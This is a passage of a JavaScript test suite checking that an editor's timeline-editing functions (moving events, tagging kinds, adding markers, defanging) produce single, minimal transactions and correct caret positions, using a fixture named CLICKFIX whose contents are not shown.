  it('applies an edit as one transaction and sets the caret', () => {
    const editor = run(CLICKFIX, moveEvent(CLICKFIX, 3, 'down'))
    expect(editor.doc).toBe(apply(CLICKFIX, moveEvent(CLICKFIX, 3, 'down')).join('\n'))
    expect(editor.transactions).toHaveLength(1)
    expect(editor.cursor).toEqual({ line: 4, ch: CLICKFIX[3].length })
  })

  it('replaces only the text that differs, so the caret elsewhere stays put', () => {
    const editor = run(CLICKFIX, setEventKind(CLICKFIX, 3, 'web'))
    expect(editor.transactions[0].changes).toEqual([
      { from: { line: 3, ch: 15 }, to: { line: 3, ch: 15 }, text: 'Web: ' }
    ])
    expect(editor.cursor).toBeNull()
    const marker = run(['- one', '- two'], makeTimeline(['- one', '- two'], 1, 1))
    expect(marker.transactions[0].changes).toEqual([
      { from: { line: 0, ch: 0 }, to: { line: 0, ch: 0 }, text: `${TIMELINE_MARKER}\n` }
    ])
  })

  it('removes whole lines, newline included', () => {
    const editor = run(CLICKFIX, backToPlainList(CLICKFIX, 1))
    expect(editor.doc).toBe([CLICKFIX[0], ...CLICKFIX.slice(2)].join('\n'))
    expect(run([TIMELINE_MARKER, '- one'], backToPlainList([TIMELINE_MARKER, '- one'], 0)).doc).toBe('- one')
  })

  it('writes nothing when nothing changes', () => {
    const editor = run(CLICKFIX, defangTimeline(CLICKFIX, 1)?.edit ?? null)
    expect(editor.transactions).toEqual([])
    expect(editor.doc).toBe(CLICKFIX.join('\n'))
  })
})
